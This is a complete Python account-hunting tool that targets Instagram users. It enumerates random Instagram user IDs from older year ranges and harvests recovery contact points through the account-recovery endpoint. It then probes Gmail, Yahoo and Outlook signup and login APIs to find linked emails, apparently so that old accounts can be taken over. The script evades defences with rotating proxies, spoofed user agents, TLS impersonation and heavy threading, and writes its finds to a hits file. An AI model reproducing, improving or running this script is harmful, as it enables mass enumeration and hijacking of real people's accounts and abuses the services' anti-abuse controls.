import sys
import subprocess
import os
import time
import re
import json
import base64
import logging
import random
import uuid
import threading
from threading import Thread
from typing import Optional
from hashlib import md5
from random import randrange, choice
from itertools import cycle

try:
    from curl_cffi import requests as curl_requests
    from curl_cffi.requests import Session as CurlSession
    CURL_AVAILABLE = True
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "curl_cffi"])
    try:
        from curl_cffi import requests as curl_requests
        from curl_cffi.requests import Session as CurlSession
        CURL_AVAILABLE = True
    except:
        CURL_AVAILABLE = False

try:
    import h2
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "h2"])
    import h2

try:
    from rich.console import Console
    from rich.table import Table
    from rich import box
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich"])
    from rich.console import Console
    from rich.table import Table
    from rich import box

try:
    import requests
    from requests import post as pp
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests
    from requests import post as pp

try:
    from user_agent import generate_user_agent as gg
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "user_agent"])
    from user_agent import generate_user_agent as gg

try:
    import httpx
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "httpx", "httpx[http2]"])
    import httpx

try:
    from faker import Faker
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "faker"])
    from faker import Faker

try:
    from bs4 import BeautifulSoup
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "beautifulsoup4"])
    from bs4 import BeautifulSoup

from concurrent.futures import ThreadPoolExecutor


class Colors:
    O  = '\x1b[38;5;208m'
    R  = '\033[1;31m'
    X  = '\033[1;33m'
    F  = '\033[2;32m'
    C  = "\033[1;97m"
    B  = '\033[2;36m'
    K  = '\033[2;35m'
    Rn = "\033[0m"
    GREEN  = '\033[92m'
    YELLOW = '\033[93m'
    RED    = '\033[91m'
    CYAN   = '\033[96m'
    RESET  = '\033[0m'


class GoogleTLManager:
    def __init__(self):
        self.tl_file = 'tl.txt'
        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'

    def _generate_random_string(self, min_len: int, max_len: int) -> str:
        return ''.join(choice(self.yy) for _ in range(randrange(min_len, max_len)))

    def fetch_new_tl(self) -> Optional[str]:
        try:
            n1   = self._generate_random_string(6, 9)
            n2   = self._generate_random_string(3, 9)
            host = self._generate_random_string(15, 30)

            he3 = {
                "accept": "*/*",
                "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "sec-ch-ua": '"Not)A;Brand";v="24", "Chromium";v="116"',
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-platform": '"Android"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": str(gg()),
            }

            session = requests.Session()
            res1 = session.get(
                'https://accounts.google.com/signin/v2/usernamerecovery'
                '?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',
                headers=he3
            )
            match = re.search(
                r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,'
                r'null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
                res1.text
            )
            if not match:
                return None
            tok = match.group(2)

            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': (
                    'https://accounts.google.com/signup/v2/createaccount'
                    '?service=mail&continue=https%3A%2F%2Fmail.google.com'
                    '%2Fmail%2Fu%2F0%2F&flowName=GlifWebSignIn&flowEntry=SignUp'
                ),
                'user-agent': gg(),
            }
            data = {
                'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,'
                         f'"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,'
                              '"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,'
                              '"",null,null,2,2]',
            }

            response = pp(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies, headers=headers, data=data,
            )
            tl   = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']

            try:
                os.remove(self.tl_file)
            except:
                pass
            with open(self.tl_file, 'a') as f:
                f.write(tl + '//' + host + '\n')
            return f'{tl}//{host}'
        except Exception as e:
            logging.error(f"TL Fetch Error: {e}")
            return None

    def get_valid_tl(self) -> str:
        try:
            with open(self.tl_file, 'r') as f:
                content = f.read().splitlines()[0]
                if content:
                    return content
        except:
            pass
        return self.fetch_new_tl() or ""


class GmailChecker:
    def __init__(self):
        self.tl_manager = GoogleTLManager()

    def check(self, email: str, retries: int = 3) -> str:
        if '@' in email:
            email = email.split('@')[0]

        for attempt in range(retries):
            try:
                try:
                    o = open('tl.txt', 'r').read().splitlines()[0]
                except:
                    result = self.tl_manager.fetch_new_tl()
                    if not result:
                        continue
                    o = open('tl.txt', 'r').read().splitlines()[0]

                tl, host = o.split('//')
                cookies  = {'__Host-GAPS': host}
                headers  = {
                    'authority': 'accounts.google.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'google-accounts-xsrf': '1',
                    'origin': 'https://accounts.google.com',
                    'referer': (
                        f'https://accounts.google.com/signup/v2/createusername'
                        f'?service=mail&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}'
                    ),
                    'user-agent': gg(),
                }
                data = (
                    f'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F'
                    f'&ddm=0&flowEntry=SignUp&service=mail&theme=mn'
                    f'&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D'
                    f'&cookiesDisabled=false'
                    f'&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull'
                    f'%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull'
                    f'%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D'
                    f'&flowName=GlifWebSignIn&'
                )

                response = pp(
                    'https://accounts.google.com/_/signup/usernameavailability',
                    params={'TL': tl},
                    cookies=cookies,
                    headers=headers,
                    data=data,
                    timeout=10,
                )
                text = response.text

                if '"gf.uar",1' in text:
                    return 'good'
                elif '"er",null,null,null,null,400' in text:
                    self.tl_manager.fetch_new_tl()
                    continue
                else:
                    return 'bad'

            except Exception:
                time.sleep(0.5)
                continue

        return 'bad'


class YahooChecker:
    def check(self, username: str, retries: int = 3) -> str:
        for attempt in range(retries):
            try:
                time.sleep(random.uniform(0.2, 0.7))
                headers = {
                    'User-Agent': gg(),
                    'Accept': 'application/json, text/plain, */*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://login.yahoo.com',
                    'Referer': 'https://login.yahoo.com/account/create',
                }

                if CURL_AVAILABLE:
                    sess = CurlSession(impersonate="chrome120")
                    r = sess.post(
                        'https://login.yahoo.com/account/module/create?execution=e1s1&_eventId=username',
                        data={
                            'specId': 'yidReg',
                            'yid': username,
                            'lang': 'en-US',
                            'done': 'https://www.yahoo.com/',
                            'acrumb': '',
                        },
                        headers=headers,
                        timeout=10,
                    )
                else:
                    r = requests.post(
                        'https://login.yahoo.com/account/module/create?execution=e1s1&_eventId=username',
                        data={
                            'specId': 'yidReg',
                            'yid': username,
                            'lang': 'en-US',
                            'done': 'https://www.yahoo.com/',
                            'acrumb': '',
                        },
                        headers=headers,
                        timeout=10,
                    )

                text = r.text
                if any(x in text for x in ['IDENTIFIER_EXISTS', '"taken"', 'yid_taken', 'already exists']):
                    return 'good'
                if any(x in text for x in ['"available"', 'AVAILABLE', 'yid_available']):
                    return 'bad'
            except Exception:
                time.sleep(0.5)
                continue
        return 'bad'


class OutlookChecker:
    def _get_flow_token(self) -> str:
        try:
            if CURL_AVAILABLE:
                sess = CurlSession(impersonate="chrome120")
                r = sess.get('https://login.live.com/', timeout=10)
            else:
                r = requests.get('https://login.live.com/', timeout=10)
            m = re.search(r'"sFT":"([^"]+)"', r.text)
            return m.group(1) if m else ''
        except:
            return ''

    def check(self, email: str, retries: int = 3) -> str:
        flow_token = self._get_flow_token()

        for attempt in range(retries):
            try:
                time.sleep(random.uniform(0.2, 0.6))
                payload = {
                    'username': email,
                    'isOtherIdpSupported': True,
                    'checkPhones': False,
                    'isRemoteNGCSupported': True,
                    'isCookieBannerShown': False,
                    'isFidoSupported': True,
                    'originalRequest': '',
                    'country': 'US',
                    'forceotclogin': False,
                    'isExternalFederationDisallowed': False,
                    'isRemoteConnectSupported': False,
                    'federationFlags': 0,
                    'isSignup': False,
                    'flowToken': flow_token,
                    'isAccessPassSupported': True,
                }
                headers = {
                    'User-Agent': gg(),
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'Origin': 'https://login.live.com',
                    'Referer': 'https://login.live.com/',
                }

                if CURL_AVAILABLE:
                    sess = CurlSession(impersonate="chrome120")
                    r = sess.post(
                        'https://login.live.com/GetCredentialType.srf',
                        json=payload,
                        headers=headers,
                        timeout=10,
                    )
                else:
                    r = requests.post(
                        'https://login.live.com/GetCredentialType.srf',
                        json=payload,
                        headers=headers,
                        timeout=10,
                    )

                data = r.json()
                if data.get('IfExistsResult') == 0:
                    return 'good'
                else:
                    return 'bad'
            except Exception:
                time.sleep(0.5)
                continue
        return 'bad'


class InstagramScraper:
    @staticmethod
    def generate_android_ua() -> str:
        devices = [
            {"brand": "samsung",  "model": "SM-G973F",      "board": "exynos9820"},
            {"brand": "samsung",  "model": "SM-A536B",      "board": "s5e8825"},
            {"brand": "Google",   "model": "Pixel 6",       "board": "raven"},
            {"brand": "Google",   "model": "Pixel 7",       "board": "panther"},
            {"brand": "Xiaomi",   "model": "Redmi Note 10", "board": "sm6150"},
            {"brand": "OnePlus",  "model": "ONEPLUS A6003", "board": "sdm845"},
        ]
        device      = random.choice(devices)
        android_ver = random.choice(["10", "11", "12", "13", "14"])
        api_level   = {"10":"29","11":"30","12":"31","13":"33","14":"34"}[android_ver]
        dpi         = random.choice(["320", "360", "420", "480"])
        width       = random.choice(["720", "1080", "1440"])
        height      = random.choice(["1520", "2280", "2400"])
        ig_ver      = f"{random.randint(280,340)}.0.0.{random.randint(10,40)}.{random.randint(80,150)}"
        locale      = random.choice(["en_US", "en_GB"])
        rnd         = random.randint(300000000, 400000000)
        return (
            f"Instagram {ig_ver} Android ({api_level}/{android_ver}; "
            f"{dpi}dpi; {width}x{height}; {device['brand']}; {device['model']}; "
            f"{device['board']}; {locale}; {rnd})"
        )

    @staticmethod
    def get_rest(user: str) -> str:
        try:
            android_ua = InstagramScraper.generate_android_ua()
            ig_did = str(uuid.uuid4()).upper()
            mid    = base64.b64encode(uuid.uuid4().bytes).decode()[:32]
            headers = {
                "User-Agent": android_ua,
                "x-ig-app-id": "567067343352427",
                "x-ig-device-id": ig_did,
                "x-ig-connection-type": "WIFI",
                "x-csrftoken": "missing",
                "Cookie": f"ig_did={ig_did}; mid={mid}; csrftoken=missing",
            }
            r = httpx.Client(http2=True, headers=headers, timeout=20).post(
                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
                data={"email_or_username": user}
            ).text
            data = json.loads(r)
            if "contact_point" in data:
                return data["contact_point"]
        except:
            pass
        return "No Rest"

    @staticmethod
    def get_info(username: str, year: str, jj: str = "gmail.com") -> str:
        try:
            url      = f'https://www.instagram.com/{username}/'
            response = requests.get(url, timeout=10)
            soup     = BeautifulSoup(response.text, 'html.parser')
            meta_desc = soup.find('meta', attrs={'name': 'description'})
            name_tag  = soup.find('meta', property='og:title')

            if meta_desc and name_tag:
                content   = meta_desc.get('content', '').replace(',', '')
                parts     = content.split()
                posts     = parts[4] if len(parts) > 4 else 'N/A'
                followers = parts[0] if len(parts) > 0 else 'N/A'
                following = parts[2] if len(parts) > 2 else 'N/A'
                name      = name_tag['content'].split('(@')[0].strip()

                return (
                    f"\n[HIT] ================================\n"
                    f"  Name      : {name}\n"
                    f"  Username  : @{username}\n"
                    f"  Email     : {username}@{jj}\n"
                    f"  Followers : {followers}\n"
                    f"  Following : {following}\n"
                    f"  Posts     : {posts}\n"
                    f"  Year      : {year}\n"
                    f"  URL       : https://www.instagram.com/{username}/\n"
                    f"  Contact   : {InstagramScraper.get_rest(username)}\n"
                    f"==================================="
                )
        except:
            pass

        return (
            f"\n[HIT] ================================\n"
            f"  Username : @{username}\n"
            f"  Email    : {username}@{jj}\n"
            f"  URL      : https://www.instagram.com/{username}/\n"
            f"  Contact  : None\n"
            f"==================================="
        )


class ProxyManager:
    def __init__(self, proxy_file: str = 'proxies.txt'):
        self.proxies = []
        self._pool   = None
        try:
            with open(proxy_file, 'r') as f:
                lines = [l.strip() for l in f if l.strip()]
            for line in lines:
                if not line.startswith('http'):
                    line = 'http://' + line
                self.proxies.append({'http': line, 'https': line})
            if self.proxies:
                self._pool = cycle(self.proxies)
                print(f"{Colors.F}[+] Loaded {len(self.proxies)} proxies{Colors.Rn}")
        except FileNotFoundError:
            print(f"{Colors.X}[!] proxies.txt not found — running without proxy{Colors.Rn}")

    def get(self) -> dict:
        if self._pool:
            return next(self._pool)
        return {}


class AccountValidator:
    def __init__(self, year: str, proxy_manager: 'ProxyManager' = None):
        self.gmail_checker   = GmailChecker()
        self.yahoo_checker   = YahooChecker()
        self.outlook_checker = OutlookChecker()
        self.year            = year
        self.proxy           = proxy_manager or ProxyManager()
        self.hits            = 0
        self.bads_instagram  = 0
        self.bads_email      = 0
        self.lock            = threading.Lock()
        self.current_email   = ""

    def update_stats(self, hits=0, bad_insta=0, bad_email=0):
        with self.lock:
            self.hits           += hits
            self.bads_instagram += bad_insta
            self.bads_email     += bad_email

    def display_status(self, current_email: str = ""):
        self.current_email = current_email
        total = self.hits + self.bads_instagram + self.bads_email
        rate  = f"{(self.hits/total*100):.1f}%" if total > 0 else "0%"
        os.system('clear' if os.name == 'posix' else 'cls')
        print(
            f"{Colors.C}+------------------------------------------+\n"
            f"| {Colors.F}[+] Hits        ==> [ {self.hits} ]{Colors.C}\n"
            f"| {Colors.R}[-] Bad IG      ==> [ {self.bads_instagram} ]{Colors.C}\n"
            f"| {Colors.X}[-] Bad Email   ==> [ {self.bads_email} ]{Colors.C}\n"
            f"| {Colors.B}[%] Hit Rate    ==> [ {rate} ]{Colors.C}\n"
            f"| {Colors.X}[~] Checking    ==> {current_email}{Colors.C}\n"
            f"+------------------------------------------+{Colors.Rn}"
        )

    def process_email(self, email: str):
        try:
            android_ua = InstagramScraper.generate_android_ua()
            ua         = gg()
            csrftoken  = md5(str(time.time()).encode()).hexdigest()
            found      = False

            self.display_status(email)

            proxy     = self.proxy.get()
            proxy_url = proxy.get('https', '') if proxy else ''

            time.sleep(random.uniform(0.3, 1.2))

            try:
                if CURL_AVAILABLE:
                    sess = CurlSession(impersonate="chrome120")
                    if proxy_url:
                        sess.proxies = {'https': proxy_url, 'http': proxy_url}
                    r0 = sess.post(
                        "https://i.instagram.com/api/v1/users/check_email/",
                        data=f"email={email}",
                        headers={
                            'User-Agent': android_ua,
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
                        },
                        timeout=10
                    )
                else:
                    client = httpx.Client(http2=True, timeout=10)
                    r0 = client.post(
                        "https://i.instagram.com/api/v1/users/check_email/",
                        data=f"email={email}",
                        headers={
                            'User-Agent': android_ua,
                            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
                        }
                    )
                    client.close()

                if 'email_is_taken' in str(r0.text):
                    found = True
                elif 'checkpoint_required' in str(r0.text):
                    self.update_stats(bad_insta=1)
                    return
            except:
                pass

            if not found:
                try:
                    time.sleep(random.uniform(0.2, 0.8))
                    if CURL_AVAILABLE:
                        sess2 = CurlSession(impersonate="chrome120")
                        if proxy_url:
                            sess2.proxies = {'https': proxy_url}
                        r1 = sess2.post(
                            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                            data={'username': email.split('@')[0]},
                            headers={
                                'accept': '*/*',
                                'content-type': 'application/x-www-form-urlencoded',
                                'origin': 'https://www.instagram.com',
                                'referer': 'https://www.instagram.com/?lang=en-US',
                                'user-agent': ua,
                                'x-csrftoken': csrftoken,
                            },
                            timeout=10
                        ).text
                    else:
                        r1 = requests.post(
                            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
                            headers={
                                'accept': '*/*',
                                'content-type': 'application/x-www-form-urlencoded',
                                'origin': 'https://www.instagram.com',
                                'referer': 'https://www.instagram.com/?lang=en-US',
                                'user-agent': ua,
                                'x-csrftoken': csrftoken,
                            },
                            data={'username': email.split('@')[0]},
                            proxies=proxy,
                            timeout=10
                        ).text
                    if '"user":true' in r1:
                        found = True
                except:
                    pass

            if found:
                self.handle_valid_email(email)
            else:
                self.update_stats(bad_insta=1)
        except:
            self.update_stats(bad_insta=1)

    def _check_email_domain(self, username: str, domain: str) -> bool:
        email = f'{username}@{domain}'
        try:
            if domain == 'gmail.com':
                return self.gmail_checker.check(email) == 'good'
            elif domain in ('yahoo.com', 'ymail.com'):
                return self.yahoo_checker.check(username) == 'good'
            elif domain in ('outlook.com', 'live.com', 'msn.com'):
                return self.outlook_checker.check(email) == 'good'
        except:
            pass
        return False

    def handle_valid_email(self, email: str):
        try:
            username, domain = email.split('@')

            if self._check_email_domain(username, domain):
                self.update_stats(hits=1)

                if self.hits % 10 == 0 and os.path.exists("tl.txt"):
                    os.remove("tl.txt")

                msg = InstagramScraper.get_info(username, self.year, domain)
                print(f"{Colors.F}{msg}{Colors.Rn}")

                with open('hits.txt', 'a', encoding='utf-8') as f:
                    f.write(msg + '\n')
            else:
                self.update_stats(bad_email=1)
        except:
            self.update_stats(bad_email=1)


class UserCollector:
    def __init__(self, validator: AccountValidator, uid1: int, uid2: int):
        self.validator       = validator
        self.uid1            = uid1
        self.uid2            = uid2
        self.ids_set         = set()
        self.found_usernames = set()

    def _rand_id(self) -> str:
        while True:
            Id = str(random.randrange(self.uid1, self.uid2))
            if Id not in self.ids_set:
                self.ids_set.add(Id)
                return Id

    def start(self, num_threads: int = 50):
        def worker():
            while True:
                try:
                    rnd = str(random.randint(150, 999))
                    ua  = (
                        "Instagram 311.0.0.32.118 Android ("
                        + random.choice(["23/6.0","24/7.0","25/7.1.1","26/8.0","28/9.0"])
                        + f"; {random.randint(100,1300)}dpi; "
                        + f"{random.randint(200,2000)}x{random.randint(200,2000)}; "
                        + random.choice(["SAMSUNG","HUAWEI","XIAOMI","OPPO","SONY"])
                        + f"; SM-T{rnd}; SM-T{rnd}; qcom; en_US; 545986{random.randint(111,999)})"
                    )
                    lsd = ''.join(
                        random.choices(
                            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789',
                            k=32
                        )
                    )
                    Id = self._rand_id()

                    headers = {
                        'accept': '*/*',
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://www.instagram.com',
                        'referer': 'https://www.instagram.com/cristiano/following/',
                        'user-agent': ua,
                        'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                        'x-fb-lsd': lsd,
                    }
                    data = {
                        'lsd': lsd,
                        'fb_api_caller_class': 'RelayModern',
                        'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                        'variables': f'{{"userID":"{Id}","username":"cristiano"}}',
                        'server_timestamps': 'true',
                        'doc_id': '7717269488336001',
                    }

                    if CURL_AVAILABLE:
                        _s = CurlSession(impersonate="chrome120")
                        response = _s.post(
                            'https://www.instagram.com/api/graphql',
                            headers=headers, data=data, timeout=10
                        )
                    else:
                        response = requests.post(
                            'https://www.instagram.com/api/graphql',
                            headers=headers, data=data, timeout=10
                        )

                    resp_json = response.json()
                    user_data = resp_json.get('data', {}).get('user', {})
                    if not user_data:
                        continue

                    username       = user_data.get('username', '')
                    follower_count = user_data.get('follower_count', 0)

                    if (
                        not username
                        or username in self.found_usernames
                        or len(username) < 4
                        or follower_count > 500
                    ):
                        continue

                    self.found_usernames.add(username)

                    contact = InstagramScraper.get_rest(username)

                    if contact and contact != 'No Rest' and '@' in contact:
                        detected_domain = contact.split('@')[-1].strip()
                        supported = {
                            'gmail.com', 'googlemail.com',
                            'yahoo.com', 'ymail.com',
                            'outlook.com', 'live.com', 'msn.com',
                        }
                        if detected_domain in supported:
                            Thread(
                                target=self.validator.process_email,
                                args=(f'{username}@{detected_domain}',),
                                daemon=True
                            ).start()
                        else:
                            for domain in ['gmail.com', 'yahoo.com', 'outlook.com']:
                                Thread(
                                    target=self.validator.process_email,
                                    args=(f'{username}@{domain}',),
                                    daemon=True
                                ).start()
                    else:
                        for domain in ['gmail.com', 'yahoo.com', 'outlook.com']:
                            Thread(
                                target=self.validator.process_email,
                                args=(f'{username}@{domain}',),
                                daemon=True
                            ).start()

                except:
                    continue

        for _ in range(num_threads):
            Thread(target=worker, daemon=True).start()
        print(f"{Colors.B}[+] {num_threads} threads started{Colors.Rn}")


BANNER = r"""
 ██╗   ██╗███╗   ██╗██████╗ ██╗██╗   ██╗ █████╗ ██╗     ███████╗██████╗
 ██║   ██║████╗  ██║██╔══██╗██║██║   ██║██╔══██╗██║     ██╔════╝██╔══██╗
 ██║   ██║██╔██╗ ██║██████╔╝██║██║   ██║███████║██║     █████╗  ██║  ██║
 ██║   ██║██║╚██╗██║██╔══██╗██║╚██╗ ██╔╝██╔══██║██║     ██╔══╝  ██║  ██║
 ╚██████╔╝██║ ╚████║██║  ██║██║ ╚████╔╝ ██║  ██║███████╗███████╗██████╔╝
  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝
"""

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    lines  = BANNER.strip('\n').split('\n')
    colors = [
        '\033[38;5;57m',
        '\033[38;5;93m',
        '\033[38;5;129m',
        '\033[38;5;165m',
        '\033[38;5;201m',
        '\033[38;5;207m',
    ]
    for i, line in enumerate(lines):
        print(colors[i % len(colors)] + line + Colors.Rn)

    print(f"""
{Colors.K}  ╔═══════════════════════════════════════════════╗
  ║  {Colors.C}  Instagram · Gmail · Yahoo · Outlook Checker  {Colors.K}║
  ║  {Colors.B}            Coded by @meaz0x8                  {Colors.K}║
  ╚═══════════════════════════════════════════════╝{Colors.Rn}
""")


def main():
    console = Console()
    print_banner()

    print(f"""{Colors.B}  Select Account Year Range:{Colors.Rn}
  ┌──────────────────────────────┐
  │  1 - 2012     2 - 2013       │
  │  3 - 2014     4 - 2015       │
  │  5 - 2016     6 - 2017       │
  │  7 - 2018     8 - 2019       │
  │  9 - 2020                    │
  └──────────────────────────────┘
""")

    ch = console.input("[cyan]>> [/cyan]")
    while ch not in [str(i) for i in range(1, 10)]:
        console.print("[red]  Invalid choice! Enter 1-9[/red]")
        ch = console.input("[cyan]>> [/cyan]")

    year_map = {
        "1": "2012", "2": "2013", "3": "2014", "4": "2015",
        "5": "2016", "6": "2017", "7": "2018", "8": "2019", "9": "2020"
    }
    uid_ranges = {
        "1": (210468786,   269736186),
        "2": (310438486,   495999999),
        "3": (1219010000,  1429010000),
        "4": (1700000000,  2400000000),
        "5": (3313668786,  3713668786),
        "6": (5398785217,  5999785217),
        "7": (7497939245,  8597939245),
        "8": (11254029834, 21254029834),
        "9": (40064475395, 43464475395),
    }

    year       = year_map[ch]
    uid1, uid2 = uid_ranges[ch]

    os.system('clear' if os.name == 'posix' else 'cls')
    print_banner()
    print(f"{Colors.B}  [*] Fetching Google TL token...{Colors.Rn}")
    GoogleTLManager().fetch_new_tl()
    time.sleep(0.5)

    proxy_mgr = ProxyManager()
    validator = AccountValidator(year, proxy_mgr)
    collector = UserCollector(validator, uid1, uid2)
    threads   = 100 if ch == "1" else 50
    collector.start(num_threads=threads)

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Colors.R}  [!] Stopped. Results saved to hits.txt{Colors.Rn}")


if __name__ == "__main__":
    main()
